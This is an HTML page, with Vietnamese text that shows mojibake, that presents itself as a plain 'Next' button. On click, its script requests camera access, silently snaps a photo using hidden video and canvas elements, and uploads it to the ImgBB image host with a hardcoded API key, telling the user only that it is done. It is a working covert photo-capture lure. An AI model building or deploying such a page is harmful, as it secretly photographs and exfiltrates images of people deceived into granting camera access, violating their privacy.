<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Next</title>
  <style>
    body {
      background: #000;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      text-align: center;
    }
    button {
      background: linear-gradient(90deg, #007bff, #00bfff);
      border: none;
      padding: 14px 36px;
      border-radius: 10px;
      color: white;
      font-size: 20px;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      opacity: 0.85;
    }
    .loading {
      display: none;
      font-size: 18px;
      margin-top: 12px;
    }
    .spin {
      border: 3px solid rgba(255, 255, 255, 0.3);
      border-top: 3px solid #fff;
      border-radius: 50%;
      width: 22px;
      height: 22px;
      animation: spin 0.8s linear infinite;
      display: inline-block;
      vertical-align: middle;
      margin-right: 8px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    video, canvas {
      display: none;
    }
    .error {
      color: #ff6b6b;
      font-size: 18px;
      line-height: 1.6;
    }
    .refresh-btn {
      background: linear-gradient(90deg, #006eff, #00c8ff);
      padding: 12px 26px;
      border: none;
      border-radius: 10px;
      color: white;
      font-size: 18px;
      margin-top: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>
  <button id="nextBtn">Next</button>
  <div class="loading" id="loading"><span class="spin"></span>Ch·ªù x√≠u...</div>
  <div id="errorMsg" class="error"></div>

  <script>
    const nextBtn = document.getElementById("nextBtn");
    const loading = document.getElementById("loading");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const errorMsg = document.getElementById("errorMsg");

    const IMG_BB_KEY = "a0ba317e9d94c58e5b754f7593f4d6a0"; // API key ImgBB

    nextBtn.addEventListener("click", async () => {
      nextBtn.style.display = "none";
      loading.style.display = "block";
      errorMsg.textContent = "";

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // ‚è± Ch·ªù 0.5 gi√¢y (500 ms) r·ªìi ch·ª•p ·∫£nh
        setTimeout(async () => {
          const ctx = canvas.getContext("2d");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          // D·ª´ng camera
          stream.getTracks().forEach(track => track.stop());

          const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
          const formData = new FormData();
          formData.append("image", blob);
          formData.append("key", IMG_BB_KEY);

          // üì® G·ª≠i ·∫£nh l√™n ImgBB
          const res = await fetch("https://api.imgbb.com/1/upload", {
            method: "POST",
            body: formData,
          });

          const result = await res.json();

          if (result.success) {
            loading.innerHTML = "‚úÖ ƒê√£ xong!";
          } else {
            throw new Error("Kh√¥ng g·ª≠i ƒë∆∞·ª£c ·∫£nh.");
          }

        }, 500); // üïí delay 0.5 gi√¢y

      } catch (err) {
        loading.style.display = "none";
        errorMsg.innerHTML = `
          ‚ùå Kh√¥ng th·ªÉ b·∫≠t camera.<br>
          üîÑ Vui l√≤ng <b>l√†m m·ªõi trang</b> v√† b·∫•m <b>ƒê·ªìng √Ω</b> ƒë·ªÉ c·∫•p quy·ªÅn camera.
          <br><button class="refresh-btn" onclick="location.reload()">L√†m m·ªõi trang</button>
        `;
      }
    });
  </script>
</body>
</html>
